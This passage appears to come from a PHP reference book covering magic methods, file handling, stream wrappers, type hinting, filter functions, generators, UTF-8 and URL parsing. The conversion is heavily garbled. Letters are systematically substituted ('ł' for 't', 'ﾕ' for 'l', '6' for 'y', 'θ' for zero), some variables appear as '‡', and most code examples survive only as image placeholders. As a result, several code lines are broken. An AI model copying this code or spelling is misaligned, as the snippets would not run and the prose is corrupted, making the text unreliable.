\*   This mełhod wiﾕﾕ be caﾕﾕed when somebody wiﾕﾕ łry ło invoke a mełhod in objecł

\*   conłexł, which does noł exisł, ﾕike:

\*

\*   $foo->mełhod($arg, $arg1);

\*

\*   Firsł argumenł wiﾕﾕ conłain łhe mełhod name(in exampﾕe above ił wiﾕﾕ be "mełhod"),

\*   and łhe second wiﾕﾕ conłain łhe vaﾕues of $arg and $arg1 as an array.

\*/

public function​call($method, $arguments)

{

// do somełhing wiłh łhał informałion here, ﾕike overﾕoading

// or somełhing generic.

// For sake of exampﾕe ﾕeł's say we're making a generic cﾕass,

// łhał hoﾕds some dała and aﾕﾕows user ło geł/seł/has via

// gełłer/sełłer mełhods. Aﾕso ﾕeł's assume łhał łhere is some

// CaseHeﾕper which heﾕps ło converł cameﾕCase inło snake\_case.

// Aﾕso łhis mełhod is simpﾕified, so ił does noł check if łhere

// is a vaﾕid name or

$snakeName \= CaseHelper::camelToSnake($method);

// Geł geł/seł/has prefix

$subMethod \= substr($snakeName, θ, 3);

// Drop mełhod name.

$propertyName \= substr($snakeName, 4);

switch ($subMethod) { case "get":

return $this\->data\[$propertyName\]; case "set":

$this\->data\[$propertyName\] = $arguments\[θ\]; break;

case "has":

return isset($this\->data\[$propertyName\]); default:

throw new BadMethodCallException("Undefined method ‡method");

}

}

/\*\*

\*   \_\_caﾕﾕSłałic wiﾕﾕ be caﾕﾕed from słałic conłenł, łhał is, when caﾕﾕing a nonexisłenł

\*   słałic mełhod:

\*

\*   Foo::buiﾕdSomełhingCooﾕ($arg);

\*

\*   Firsł argumenł wiﾕﾕ conłain łhe mełhod name(in exampﾕe above ił wiﾕﾕ be "buiﾕdSomełhingCooﾕ"),

\*   and łhe second wiﾕﾕ conłain łhe vaﾕue $arg in an array.

\*

\*   Nołe łhał signałure of łhis mełhod is differenł(requires słałic keyword). This mełhod was noł

\*   avaiﾕabﾕe prior PHP 5.3

\*/​242

![](image_rsrcMK8.jpg)

![](image_rsrcMK9.jpg)Example:

Section 42.2:    get(),      set(),     isset() and     unset()

Whenever you attempt to retrieve a certain field from a class like so:

![](image_rsrcMKA.jpg)

PHP invokes the magic method  get($name), with $name equal to "height" in this case. Writing to a class field like so:

![](image_rsrcMKB.jpg)

Will invoke the magic method  set($name, $value), with $name equal to "height" and $value equal to 1θ.

PHP also has two built-in functions isset(), which check if a variable exists, and unset(), which destroys a variable. Checking whether a objects field is set like so:

![](image_rsrcMKC.jpg)

Will invoke the  isset($name) function on that object. Destroying a variable like so:

![](image_rsrcMKD.jpg)

Will invoke the  unset($name) function on that object.

Normally, when you don't define these methods on your class, PHP just retrieves the field as it is stored in your class. However, you can override these methods to create classes that can hold data like an array, but are usable like an object:

![](image_rsrcMKE.jpg)

![](image_rsrcMKF.jpg)

empty() function and magic methods

Note that calling empty() on a class attribute will invoke  isset() because as the PHP manual states:

![](image_rsrcM38.jpg)empty() is essentially the concise equivalent to !isset($var) || $var == false

Section 42.3:    construct() and     destruct()

 construct() is the most common magic method in PHP, because it is used to set up a class when it is initialized. The opposite of the  construct() method is the  destruct() method. This method is called when there are no more references to an object that you created or when you force its deletion. PHP's garbage collection will clean up the object by first calling its destructor and then removing it from memory.

![](image_rsrcMKG.jpg)

![](image_rsrcMKH.jpg)

Section 42.4:     toString()

Whenever an object is treated as a string, the  toString() method is called. This method should return a string representation of the class.

![](image_rsrcMKJ.jpg)

245

Section 42.5:    clone()

 clone is invoked by use of the clone keyword. It is used to manipulate object state upon cloning, after the object has been actually cloned.

![](image_rsrcMKK.jpg)

Example:

![](image_rsrcMKM.jpg)

Section 42.6:    invoke()

This magic method is called when user tries to invoke object as a function. Possible use cases may include some approaches like functional programming or some callbacks.

![](image_rsrcMKN.jpg)

![](image_rsrcMKP.jpg)

Section 42.7:   sleep() and     wakeup()

![](image_rsrcMKR.jpg)![](image_rsrcMKS.jpg) sleep and  wakeup are methods that are related to the serialization process. serialize function checks if a class has a  sleep method. If so, it will be executed before any serialization.  sleep is supposed to return an array of the names of all variables of an object that should be serialized.

 wakeup in turn will be executed by unserialize if it is present in class. It's intention is to re-establish resources and other things that are needed to be initialized upon unserialization.

![](image_rsrcMKT.jpg)

Section 42.8:    debugInfo()

![](image_rsrcMKU.jpg)This method is called by var\_dump() when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown.

![](image_rsrcMKV.jpg)PHP Manual

![](image_rsrcMKW.jpg)

Version c 5.6

![](image_rsrcMKX.jpg)

The above example will output:

![](image_rsrcMKY.jpg)

Version ≥ 5.6

![](image_rsrcMKZ.jpg)

The above example will output:

![](image_rsrcMM0.jpg)

248

Chapter 43: File handling

Parameter​Description

filename​The filename being read.

![](image_rsrcMM1.jpg)You can use the optional second parameter and set it to TRUE, if you want to search for the file in the include\_path, too.

context​A context stream resource.

Section 43.1: Convenience functions

Raw direct IO

file\_get\_contents and file\_put\_contents provide the ability to read/write from/to a file to/from a PHP string in a single call.

file\_put\_contents can also be used with the FILE\_APPEND bitmask flag to append to, instead of truncate and overwrite, the file. It can be used along with LOCK\_EX bitmask to acquire an exclusive lock to the file while proceeding to writing. Bitmask flags can be joined with the | bitwise-OR operator.

![](image_rsrcMM2.jpg)

FILE\_APPEND is handy for appending to log files while LOCK\_EX helps prevent race condition of file writing from multiple processes. For example, to write to a log file about the current session:

![](image_rsrcMM3.jpg)

CSV IO

![](image_rsrcMM4.jpg)

The fgetcsv parses line from open file checking for csv fields. It returns CSV fields in an array on success or FALSE

on failure.

By default, it will read only one line of the CSV file.

![](image_rsrcMM5.jpg)

contacts.csv

![](image_rsrcMM6.jpg)

Output:

![](image_rsrcMM7.jpg)

![](image_rsrcMM8.jpg)

Reading a file to stdout directly

readfile copies a file to the output buffer. readfile() will not present any memory issues, even when sending large files, on its own.

![](image_rsrcMM9.jpg)

Or from a file pointer

Alternatively, to seek a point in the file to start copying to stdout, use fpassthru instead. In the following example, the last 1024 bytes are copied to stdout:

![](image_rsrcMMA.jpg)

Reading a file into an array

file returns the lines in the passed file in an array. Each element of the array corresponds to a line in the file, with the newline still attached.

![](image_rsrcMMB.jpg)

test.txt

![](image_rsrcMMC.jpg)

Output:

![](image_rsrcMMD.jpg)

250

Section 43.2: Deleting files and directories

Deleting files

The unlink function deletes a single file and returns whether the operation was successful.

![](image_rsrcMME.jpg)

Deleting directories, with recursive deletion

On the other hand, directories should be deleted with rmdir. However, this function only deletes empty directories. To delete a directory with files, delete the files in the directories first. If the directory contains subdirectories, recursion may be needed.

The following example scans files in a directory, deletes member files/directories recursively, and returns the number of files (not directories) deleted.

![](image_rsrcMMF.jpg)

Section 43.3: Getting file information

Check if a path is a directory or a file

The is\_dir function returns whether the argument is a directory, while is\_file returns whether the argument is a file. Use file\_exists to check if it is either.

![](image_rsrcMMG.jpg)

![](image_rsrcMMH.jpg)

This gives:

![](image_rsrcMMJ.jpg)

Checking file type

Use filetype to check the type of a file, which may be:

![](image_rsrcMMK.jpg)![](image_rsrcMMM.jpg)![](image_rsrcMMN.jpg)![](image_rsrcMMP.jpg)![](image_rsrcMMR.jpg)![](image_rsrcMMS.jpg)![](image_rsrcMMT.jpg)![](image_rsrcMMU.jpg)fifo char dir block link file socket unknown

Passing the filename to the filetype directly:

![](image_rsrcMMV.jpg)

Note that filetype returns false and triggers an E\_WARNING if the file doesn't exist. Checking readability and writability

Passing the filename to the is\_writable and is\_readable functions check whether the file is writable or readable respectively.

The functions return false gracefully if the file does not exist. Checking file access/modify time

Using filemtime and fileatime returns the timestamp of the last modification or access of the file. The return value is a Unix timestamp -- see Working with Dates and Time for details.

![](image_rsrcMMW.jpg)

Get path parts with fileinfo

![](image_rsrcMMX.jpg)

![](image_rsrcMMY.jpg)

This example will output:

![](image_rsrcMMZ.jpg)

Which can be used as:

![](image_rsrcMN0.jpg)

Parameter​Details

$path​The full path of the file to be parsed

$option

One of four available options \[PATHINFO\_DIRNAME, PATHINFO\_BASENAME, PATHINFO\_EXTENSION or PATHINFO\_FILENAME\]

![](image_rsrcMN1.jpg)If an option (the second parameter) is not passed, an associative array is returned otherwise a string is returned.

![](image_rsrcMN2.jpg)Does not validate that the file exists.

![](image_rsrcMN3.jpg)Simply parses the string into parts. No validation is done on the file (no mime-type checking, etc.)

![](image_rsrcMN4.jpg)The extension is simply the last extension of $path The path for the file image.jpg.png would be .png even if it technically a .jpg file. A file without an extension will not return an extension element in the array.

Section 43.4: Stream-based file IO

Opening a stream

fopen opens a file stream handle, which can be used with various functions for reading, writing, seeking and other functions on top of it. This value is of resource type, and cannot be passed to other threads persisting its functionality.

![](image_rsrcMN5.jpg)

The second parameter is the mode of the file stream:

Mode Description

r Open in read only mode, starting at the beginning of the file

r+ Open for reading and writing, starting at the beginning of the file

![](image_rsrcMN6.jpg)w open for writing only, starting at the beginning of the file. If the file exists it will empty the file. If it doesn't exist it will attempt to create it.

![](image_rsrcMN7.jpg)

open for reading and writing, starting at the beginning of the file. If the file exists it will empty the file. If it doesn't exist it will attempt to create it.

a open a file for writing only, starting at the end of the file. If the file does not exist, it will try to create it

![](image_rsrcMN8.jpg)

open a file for reading and writing, starting at the end of the file. If the file does not exist, it will try to create it

253

x create and open a file for writing only. If the file exists the fopen call will fail

x+ create and open a file for reading and writing. If the file exists the fopen call will fail

![](image_rsrcMN9.jpg)c open the file for writing only. If the file does not exist it will try to create it. It will start writing at the beginning of the file, but will not empty the file ahead of writing

![](image_rsrcMNA.jpg)

open the file for reading and writing. If the file does not exist it will try to create it. It will start writing at the beginning of the file, but will not empty the file ahead of writing

Adding a t behind the mode (e.g. a+b, wt, etc.) in Windows will translate "\\n" line endings to "\\r\\n" when working with the file. Add b behind the mode if this is not intended, especially if it is a binary file.

The PHP application should close streams using fclose when they are no longer used to prevent the Too many open files error. This is particularly important in CLI programs, since the streams are only closed when the runtime shuts down -- this means that in web servers, it may not be necessary (but still should, as a practice to prevent resource leak) to close the streams if you do not expect the process to run for a long time, and will not open many streams.

Reading

Using fread will read the given number of bytes from the file pointer, or until an EOF is met.

Reading lines

Using fgets will read the file until an EOL is reached, or the given length is read.

Both fread and fgets will move the file pointer while reading.

Reading everything remaining

Using stream\_get\_contents will all remaining bytes in the stream into a string and return it.

Adjusting file pointer position

Initially after opening the stream, the file pointer is at the beginning of the file (or the end, if the mode a is used). Using the fseek function will move the file pointer to a new position, relative to one of three values:

![](image_rsrcMNB.jpg)SEEK\_SET: This is the default value; the file position offset will be relative to the beginning of the file.

![](image_rsrcMNC.jpg)SEEK\_CUR: The file position offset will be relative to the current position.

![](image_rsrcMND.jpg)SEEK\_END: The file position offset will be relative to the end of the file. Passing a negative offset is the most common use for this value; it will move the file position to the specified number of bytes before the end of file.

rewind is a convenience shortcut of fseek($fh, θ, SEEK\_SET).

Using ftell will show the absolute position of the file pointer.

For example, the following script reads skips the first 10 bytes, reads the next 10 bytes, skips 10 bytes, reads the next 10 bytes, and then the last 10 bytes in file.txt:

![](image_rsrcMNE.jpg)

![](image_rsrcMNF.jpg)

Writing

Using fwrite writes the provided string to the file starting at the current file pointer.

![](image_rsrcMNG.jpg)

Section 43.5: Moving and Cop6ing files and directories

Copying files

copy copies the source file in the first argument to the destination in the second argument. The resolved destination needs to be in a directory that is already created.

![](image_rsrcMNH.jpg)

Copying directories, with recursion

Copying directories is pretty much similar to deleting directories, except that for files copy instead of unlink is used, while for directories, mkdir instead of rmdir is used, at the beginning instead of being at the end of the function.

![](image_rsrcMNJ.jpg)

Renaming/Moving

![](image_rsrcMNK.jpg)Renaming/Moving files and directories is much simpler. Whole directories can be moved or renamed in a single call, using the rename function.

![](image_rsrcMNM.jpg)rename("~/dir", "~/old\_dir");

![](image_rsrcMNN.jpg)rename("~/dir/file.txt", "~/dir2/file.txt");

Section 43.6: Minimize memor6 usage when dealing with large files

If we need to parse a large file, e.g. a CSV more than 10 Mbytes containing millions of rows, some use file or

![](image_rsrcKN7.jpg)file\_get\_contents functions and end up with hitting memory\_limit setting with

Allowed memory size of XXXXX bytes exhausted

error. Consider the following source (top-1m.csv has exactly 1 million rows and is about 22 Mbytes of size)

![](image_rsrcMNP.jpg)

This outputs:

![](image_rsrcMNR.jpg)

because the interpreter needed to hold all the rows in $arr array, so it consumed ~200 Mbytes of RAM. Note that we haven't even done anything with the contents of the array.

Now consider the following code:

![](image_rsrcMNS.jpg)

which outputs

![](image_rsrcMNT.jpg)

so we don't use a single extra byte of memory, but parse the whole CSV and save it to another file reversing the value of the 2nd column. That's because fgetcsv reads only one row and $row is overwritten in every loop.

Chapter 44: Streams

Parameter Name​Description

Stream Resource The data provider consisting of the <scheme>://<target> syntax

Section 44.1: Registering a stream wrapper

A stream wrapper provides a handler for one or more specific schemes.

The example below shows a simple stream wrapper that sends PATCH HTTP requests when the stream is closed.

![](image_rsrcMNU.jpg)// regisłer łhe FooWrapper cﾕass as a wrapper for foo:// URLs.

stream\_wrapper\_register("foo", FooWrapper::class, STREAM\_IS\_URL) or die("Duplicate stream wrapper

registered");

class FooWrapper {

// łhis wiﾕﾕ be modified by PHP ło show łhe conłexł passed in łhe currenł caﾕﾕ.

public $context;

// łhis is used in łhis exampﾕe inłernaﾕﾕy ło słore łhe URL

private $url;

// when fopen() wiłh a prołocoﾕ for łhis wrapper is caﾕﾕed, łhis mełhod can be impﾕemenłed ło słore dała ﾕike łhe hosł.

public function stream\_open(string $path, string $mode, int $options, string &$openedPath) : bool {

$url \= parse\_url($path); if($url \=== false) return false;

$this\->url \= $url\["host"\] . "/" . $url\["path"\]; return true;

}

// handﾕes caﾕﾕs ło fwriłe() on łhis słream

public function stream\_write(string $data) : int {

$this\->buffer .= $data; return strlen($data);

}

// handﾕes caﾕﾕs ło fcﾕose() on łhis słream

public function stream\_close() {

$curl \= curl\_init("http://" . $this\->url); curl\_setopt($curl, CURLOPT\_POSTFIELDS, $this\->buffer); curl\_setopt($curl, CURLOPT\_CUSTOMREQUEST, "PATCH"); curl\_exec($curl);

curl\_close($curl);

$this\->buffer \= "";

}

// faﾕﾕback excepłion handﾕer if an unsupporłed operałion is ałłempłed.

// łhis is noł necessary.

public function  call($name, $args) {

throw new \\RuntimeException("This wrapper does not support ‡name");

}

// łhis is caﾕﾕed when unﾕink("foo://somełhing\-eﾕse") is caﾕﾕed.

public function unlink(string $path) {

$url \= parse\_url($path);

$curl \= curl\_init("http://" . $url\["host"\] . "/" . $url\["path"\]); curl\_setopt($curl, CURLOPT\_CUSTOMREQUEST, "DELETE");

257

![](image_rsrcMNV.jpg)

This example only shows some examples of what a generic stream wrapper would contain. These are not all methods available. A full list of methods that can be implemented can be found at [http://php.net/streamWrapper.](http://php.net/streamWrapper)

258

Chapter 45: T6pe hinting

Section 45.1: T6pe hinting classes and interfaces

![](image_rsrcMNW.jpg)

Type hinting for classes and interfaces was added in PHP 5. Class type hint

![](image_rsrcKH6.jpg)The above script outputs:

Chris is being enrolled at University of Edinburgh

![](image_rsrcMNX.jpg)Interface type hint

![](image_rsrcMNY.jpg)

![](image_rsrcKN7.jpg)The above example outputs the same as before:

Chris is being enrolled at University of Edinburgh

Self type hints

The self keyword can be used as a type hint to indicate that the value must be an instance of the class that declares the method.

Section 45.2: T6pe hinting scalar t6pes, arra6s and callables

Support for type hinting array parameters (and return values after PHP 7.1) was added in PHP 5.1 with the keyword

array. Any arrays of any dimensions and types, as well as empty arrays, are valid values.

Support for type hinting callables was added in PHP 5.4. Any value that is\_callable() is valid for parameters and return values hinted callable, i.e. Closure objects, function name strings and array(class\_name|object, method\_name).

![](image_rsrcKNA.jpg)If a typo occurs in the function name such that it is not is\_callable(), a less obvious error message would be displayed:

Fatal error: Uncaught TypeError: Argument 1 passed to foo() must be of the type callable, string/array given

![](image_rsrcMNZ.jpg)

![](image_rsrcMP0.jpg)Nonstatic methods can also be passed as callables in static format, resulting in a deprecation warning and level E\_STRICT error in PHP 7 and 5 respectively.

Method visibility is taken into account. If the context of the method with the

to the callable provided, it will end up as if the method does not exist.

parameter does not have access

![](image_rsrcMP1.jpg)

![](image_rsrcMP2.jpg)

![](image_rsrcKN7.jpg)Output:

Fatal error: Uncaught TypeError: Argument 1 passed to r() must be callable, array given

Support for type hinting scalar types was added in PHP 7. This means that we gain type hinting support for

booleans, integers, floats and strings.

![](image_rsrcMP3.jpg)

By default, PHP will attempt to cast any provided argument to match its type hint. Changing the call to add(1.5, 2)

gives exactly the same output, since the float 1.5 was cast to int by PHP.

To stop this behavior, one must add declare(strict\_types\=1); to the top of every PHP source file that requires it.

![](image_rsrcMP4.jpg)

![](image_rsrcKN7.jpg)The above script now produces a fatal error:

Fatal error: Uncaught TypeError: Argument 1 passed to add() must be of the type integer, float given

An Exception: Special Types

Some PHP functions may return a value of type resource. Since this is not a scalar type, but a special type, it is not possible to type hint it.

![](image_rsrcKH6.jpg)As an example, curl\_init() will return a resource, as well as fopen(). Of course, those two resources aren't compatible to each other. Because of that, PHP 7 will always throw the following TypeError when type hinting resource explicitly:

TypeError: Argument 1 passed to sample() must be an instance of resource, resource given

Section 45.3: Nullable t6pe hints

Parameters

Nullable type hint was added in PHP 7.1 using the ? oper2a6to1r before the type hint.

![](image_rsrcMP5.jpg)

Before PHP 7.1, if a parameter has a type hint, it must declare a default value null to accept null values.

![](image_rsrcMP6.jpg)

Return values

In PHP 7.0, functions with a return type must not return null.

In PHP 7.1, functions can declare a nullable return type hint. However, the function must still return null, not void (no/empty return statements).

![](image_rsrcMP7.jpg)

Section 45.4: T6pe hinting generic objects

Since PHP objects don't inherit from any base class (including stdClass), there is no support for type hinting a generic object type.

For example, the below will not work.

![](image_rsrcMP8.jpg)

![](image_rsrcMP9.jpg)And will throw a fatal error:

Fatal error: Uncaught TypeError: Argument 1 passed to doSomething() must be an instance of object,

A workaround to this is to declare a degenerate interface that defines no methods, and have all of your objects implement this interface.

![](image_rsrcMPA.jpg)

Section 45.5: T6pe Hinting No Return(Void)

In PHP 7.1, the void return type was added. While PHP has no actual void value, it is generally understood across programming languages that a function that returns nothing is returning void. This should not be confused with returning null, as null is a value that can be returned.

![](image_rsrcMPB.jpg)

Note that if you declare a void return, you cannot return any values or you will get a fatal error:

![](image_rsrcMPC.jpg)

However, using return to exit the function is valid:

![](image_rsrcMPD.jpg)

Chapter 46: Filters & Filter Functions

Parameter​Details

variable​Value to filter. Note that scalar values are converted to string internally before they are filtered.

![](image_rsrcMPE.jpg)![](image_rsrcMPF.jpg)\-

The ID of the filter to apply. The Types of filters manual page lists the available filters.If omitted,

filter

![](image_rsrcMPG.jpg)

options

FILTER\_DEFAULT will be used, which is equivalent to FILTER\_UNSAFE\_RAW. This will result in no filtering taking place by default.

![](image_rsrcMPF.jpg)\-

Associative array of options or bitwise disjunction of flags. If filter accepts options, flags can be provided in "flags" field of array. For the "callback" filter, callable type should be passed. The callback must accept one argument, the value to be filtered, and return the value after filtering/sanitizing it.

This extension filters data by either validating or sanitizing it. This is especially useful when the data source contains unknown (or foreign) data, like user supplied input. For example, this data may come from an HTML form.

Section 46.1: Validating Boolean Values

![](image_rsrcMPH.jpg)

Section 46.2: Validating A Number Is A Float

Validates value as float, and converts to float on success.

![](image_rsrcMPJ.jpg)

![](image_rsrcMPK.jpg)

Results

![](image_rsrcMPM.jpg)

Section 46.3: Validate A MAC Address

Validates a value is a valid MAC address

![](image_rsrcMPN.jpg)

Results:

![](image_rsrcMPP.jpg)

Section 46.4: Sanitze Email Addresses

Remove all characters except letters, digits and !#$%&'\*+-=?^\_\`{|}~@.\[\].

![](image_rsrcMPR.jpg)

![](image_rsrcMPS.jpg)

Results:

![](image_rsrcMPT.jpg)

Section 46.5: Sanitize Integers

Remove all characters except digits, plus and minus sign.

![](image_rsrcMPU.jpg)

Results:

![](image_rsrcMPV.jpg)

Section 46.6: Sanitize URLs

Sanitze URLs

Remove all characters except letters, digits and $-\_.+!\*'(),{}|\\^~\[\]\`<\>#%";/?:@&\=

266

![](image_rsrcMPW.jpg)

Results:

![](image_rsrcMPX.jpg)

Section 46.7: Validate Email Address

When filtering an email address filter\_var() will return the filtered data, in this case the email address, or false if a valid email address cannot be found:

![](image_rsrcMPY.jpg)

Results:

![](image_rsrcMPZ.jpg)

This function doesn't validate not-latin characters. Internationalized domain name can be validated in their xn\--

form.

Note that you cannot know if the email address is correct before sending an email to it. You may want to do some extra checks such as checking for a MX record, but this is not necessary. If you send a confirmation email, don't forget to remove unused accounts after a short period.

Section 46.8: Validating A Value Is An Integer

When filtering a value that should be an integer filter\_var() will return the filtered data, in this case the integer, or false if the value is not an integer. Floats are not integers:

![](image_rsrcMR0.jpg)

Results:

![](image_rsrcMR1.jpg)

![](image_rsrcMR2.jpg)

If you are expecting only digits, you can use a regular expression:

![](image_rsrcMR3.jpg)

If you convert this value into an integer, you don't have to do this check and so you can use filter\_var.

Section 46.9: Validating An Integer Falls In A Range

When validating that an integer falls in a range the check includes the minimum and maximum bounds:

![](image_rsrcMR4.jpg)

Results:

![](image_rsrcMR5.jpg)

Section 46.10: Validate a URL

When filtering a URL filter\_var() will return the filtered data, in this case the URL, or false if a valid URL cannot be found:

URL: example.com

![](image_rsrcMR6.jpg)

Results:

![](image_rsrcMR7.jpg)

URL: [http://exampﾕe.com](http://exampﾕe.com/)

![](image_rsrcMR8.jpg)

Results:

![](image_rsrcMR9.jpg)

URL: [http://www.exampﾕe.com](http://www.exampﾕe.com/)

![](image_rsrcMRA.jpg)

Results:

![](image_rsrcMRB.jpg)

URL:​[http://www.exampﾕe.com/pałh/ło/dir/](http://www.exampﾕe.com/pałh/ło/dir/)

![](image_rsrcMRC.jpg)

Results:

![](image_rsrcMRD.jpg)

URL:​[http://www.exampﾕe.com/pałh/ło/dir/index.php](http://www.exampﾕe.com/pałh/ło/dir/index.php)

![](image_rsrcMRE.jpg)

![](image_rsrcMRF.jpg)

Results:

![](image_rsrcMRG.jpg)

URL:​[http://www.exampﾕe.com/pałh/ło/dir/index.php?łesł=y](http://www.exampﾕe.com/pałh/ło/dir/index.php?łesł=y)

![](image_rsrcMRH.jpg)

Results:

![](image_rsrcMRJ.jpg)

Warning: You must check the protocol to protect you against an XSS attack:

![](image_rsrcMRK.jpg)

Section 46.11: Sanitize Floats

Remove all characters except digits, +- and optionally .,eE.

![](image_rsrcMRM.jpg)

Results:

270

![](image_rsrcMRN.jpg)

With the FILTER\_FLAG\_ALLOW\_THOUSAND option:

![](image_rsrcMRP.jpg)

Results:

![](image_rsrcMRR.jpg)

With the FILTER\_FLAG\_ALLOW\_SCIENTIFIC option:

![](image_rsrcMRS.jpg)

![](image_rsrcMRT.jpg)

Results:

![](image_rsrcMRU.jpg)

Section 46.12: Validate IP Addresses

Validates a value is a valid IP address

![](image_rsrcMRV.jpg)

Results:

![](image_rsrcMRW.jpg)

Validate an valid IPv4 IP address:

![](image_rsrcMRX.jpg)

Results:

![](image_rsrcMRY.jpg)

Validate an valid IPv6 IP address:

![](image_rsrcMRZ.jpg)

Results:

![](image_rsrcMS0.jpg)

Validate an IP address is not in a private range:

![](image_rsrcMS1.jpg)

Results:

![](image_rsrcMS2.jpg)

Validate an IP address is not in a reserved range:

![](image_rsrcMS3.jpg)

Results:

![](image_rsrcMS4.jpg)

Section 46.13: Sanitize filters

![](image_rsrcMS5.jpg)

we can use filters to sanitize our variable according to our need. Example

above will remove the html tags from $string variable.

Chapter 47: Generators

Section 47.1: The Yield ße6word

A yield statement is similar to a return statement, except that instead of stopping execution of the function and returning, yield instead returns a Generator object and pauses execution of the generator function.

Here is an example of the range function, written as a generator:

![](image_rsrcMS6.jpg)

You can see that this function returns a Generator object by inspecting the output of var\_dump:

![](image_rsrcMS7.jpg)

Yielding Values

The Generator object can then be iterated over like an array.

![](image_rsrcMS8.jpg)

The above example will output:

![](image_rsrcMS9.jpg)

Yielding Values with Keys

In addition to yielding values, you can also yield key/value pairs.

![](image_rsrcMSA.jpg)

The above example will output:

![](image_rsrcMSB.jpg)

Section 47.2: Reading a large file with a generator

One common use case for generators is reading a file from disk and iterating over its contents. Below is a class that allows you to iterate over a CSV file. The memory usage for this script is very predictable, and will not fluctuate depending on the size of the CSV file.

![](image_rsrcMSC.jpg)

Section 47.3: Wh6 use a generator?

Generators are useful when you need to generate a large collection to later iterate over. They're a simpler alternative to creating a class that implements an I terator, which is often overkill.

For example, consider the below function.

![](image_rsrcMSD.jpg)

randomNumbers(1θ), which will give us an array of 10 random numbers. What if we want to generate one million random numbers? randomNumbers(1θθθθθθ) will do that for us, but at a cost of memory. One million integers stored in an array uses approximately 33 megabytes of memory.

![](image_rsrcMSE.jpg)

This is due to the entire one million random numbers being generated and returned at once, rather than one at a time. Generators are an easy way to solve this issue.

Section 47.4: Using the send()-function to pass values to a generator

Generators are fast coded and in many cases a slim alternative to heavy iterator-implementations. With the fast implementation comes a little lack of control when a generator should stop generating or if it should generate something else. However this can be achieved with the usage of the send() function, enabling the requesting function to send parameters to the generator after every loop.

![](image_rsrcMSF.jpg)

Resulting in this Output:

![](image_rsrcMSG.jpg)

Chapter 48: UTF-8

Section 48.1: Input

![](image_rsrcMSH.jpg)You should verify every received string as being valid UTF-8 before you try to store it or use it anywhere. PHP's mb\_check\_encoding() does the trick, but you have to use it consistently. There's really no way around this, as malicious clients can submit data in whatever encoding they want.

![](image_rsrcMSJ.jpg)

![](image_rsrcMSK.jpg)If you're using HTML5 then you can ignore this last point. You want all data sent to you by browsers to be in UTF-8. The only reliable way to do this is to add the accept\-charset attribute to all of your <form> tags like so:

![](image_rsrcMSM.jpg)

Section 48.2: Output

![](image_rsrcMSN.jpg)If your application transmits text to other systems, they will also need to be informed of the character encoding. In PHP, you can use the default\_charset option in php.ini, or manually issue the Content\-Type MIME header yourself. This is the preferred method when targeting modern browsers.

![](image_rsrcMSP.jpg)

![](image_rsrcMSR.jpg)If you are unable to set the response headers, then you can also set the encoding in an HTML document with HTML metadata.

![](image_rsrcMSS.jpg)HTML5

![](image_rsrcMST.jpg)

Older versions of HTML

![](image_rsrcMSU.jpg)![](image_rsrcMSV.jpg)

Section 48.3: Data Storage and Access

![](image_rsrcKMR.jpg)This topic specifically talks about UTF-8 and considerations for using it with a database. If you want more information about using databases in PHP then checkout this topic.

Storing Data in a MySQL Database:

![](image_rsrcMSW.jpg)Specify the utf8mb4 character set on all tables and text columns in your database. This makes MySQL physically store and retrieve values encoded natively in UTF-8.

![](image_rsrcKX3.jpg)MySQL will implicitly use utf8mb4 encoding if a utf8mb4\_\* collation is specified (without any explicit character set).

![](image_rsrcMSX.jpg)Older versions of MySQL (< 5.5.3) do not support utf8mb4 so you'll be forced to use utf8, which only supports a subset of Unicode characters.

Accessing Data in a MySQL Database:

![](image_rsrcMSY.jpg)In your application code (e.g. PHP), in whatever DB access method you use, you'll need to set the connection charset to utf8mb4. This way, MySQL does no conversion from its native UTF-8 when it hands data off to your application and vice versa.

![](image_rsrcMSZ.jpg)Some drivers provide their own mechanism for configuring the connection character set, which both updates its own internal state and informs MySQL of the encoding to be used on the connection. This is usually the preferred approach.

For Example (The same consideration regarding utf8mb4/utf8 applies as above):

![](image_rsrcMT0.jpg)

![](image_rsrcMT1.jpg)If you're using the PDO abstraction layer with PHP  5.3.6, you can specify charset in the DSN:

![](image_rsrcMT2.jpg)

If you're using mysqli, you can call set\_charset():

![](image_rsrcMT3.jpg)![](image_rsrcMT4.jpg)

If the database driver does not provide its own mechanism for setting the connection character set, you may have to issue a query to tell MySQL how your application expects data on the connection to be encoded: SET NAMES 'utf8mb4'.

Chapter 49: Unicode Support in PHP

Section 49.1: Converting Unicode characters to ”\\uxxxx”

format using PHP

You can use the following code for going back and forward.

![](image_rsrcMT5.jpg)

![](image_rsrcMT6.jpg)How to use:

![](image_rsrcMT7.jpg)Output:

Section 49.2: Converting Unicode characters to their numeric value and/or HTML entities using PHP

You can use the following code for going back and forward.

![](image_rsrcMT8.jpg)

![](image_rsrcMT9.jpg)

![](image_rsrcMTA.jpg)How to use :

Output :

![](image_rsrcMTB.jpg)

![](image_rsrcMTC.jpg)

Section 49.3: Intl extention for Unicode support

Native string functions are mapped to single byte functions, they do not work well with Unicode. The extentions iconv and mbstring offer some support for Unicode, while the Intl-extention offers full support. Intl is a wrapper for the facto de standard ICU library, see [http://site.icu-project.org](http://site.icu-project.org/) for detailed information that is not available on [http://php.net/manual/en/book.intl.php](http://php.net/manual/en/book.intl.php) . If you can not install the extention, have a look at an alternative implementation of Intl from the Symfony framework.

ICU offers full Internationalization of which Unicode is only a smaller part. You can do transcoding easily:

![](image_rsrcMTD.jpg)

But, do not dismiss iconv just yet, consider:

![](image_rsrcMTE.jpg)

Chapter 50: URLs

Section 50.1: Parsing a URL

To separate a URL into its individual components, use parse\_url():

![](image_rsrcMTF.jpg)

After executing the above, the contents of $parts would be:

![](image_rsrcMTG.jpg)

You can also selectively return just one component of the url. To return just the querystring:

![](image_rsrcMTH.jpg)

Any of the following constants are accepted: PHP\_URL\_SCHEME, PHP\_URL\_HOST, PHP\_URL\_PORT, PHP\_URL\_USER, PHP\_URL\_PASS, PHP\_URL\_PATH, PHP\_URL\_QUERY and PHP\_URL\_FRAGMENT.

To further parse a query string into key value pairs use parse\_str():

![](image_rsrcMTJ.jpg)

After execution of the above, the $params array would be populated with the following:

![](image_rsrcMTK.jpg)

Section 50.2: Build an URL-encoded quer6 string from an arra6

The http\_build\_query() will create a query string from an array or object. These strings can be appended to a URL to create a GET request, or used in a POST request with, for example, cURL.

![](image_rsrcMTM.jpg)

$queryString will have the following value:

![](image_rsrcMTN.jpg)

http\_build\_query() will also work with multi-dimensional arrays:

![](image_rsrcMTP.jpg)

$queryString will have this value:

![](image_rsrcMTR.jpg)

which is the URL-encoded version of

![](image_rsrcMTS.jpg)

Section 50.3: Redirecting to another URL

